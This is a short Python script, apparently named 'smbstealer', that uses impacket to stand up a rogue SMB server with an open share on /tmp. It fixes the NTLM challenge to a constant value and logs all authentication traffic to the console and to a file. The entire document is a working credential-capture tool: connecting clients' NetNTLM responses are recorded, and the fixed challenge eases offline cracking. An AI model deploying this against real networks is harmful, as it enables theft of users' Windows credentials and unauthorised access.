import sys
import logging

from impacket import smbserver


# Logger to write to both console and file
class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        self.log = open('smbstealer.log', 'w')

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)
        self.log.flush()

# Init logging
handler = logging.StreamHandler(Logger())
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.DEBUG)

# Create a new SMB server
server = smbserver.SimpleSMBServer()

# Add a share called Public and link it to /tmp directory
server.addShare('Public', '/tmp', 'Public Share')

# We want to support SMBv2
server.setSMB2Support(True)

# Set a custom SMB challenge
server.setSMBChallenge('deaddeaddeaddead')

# Log SMB traffic to console
server.setLogFile('')

# Start the server
server.start()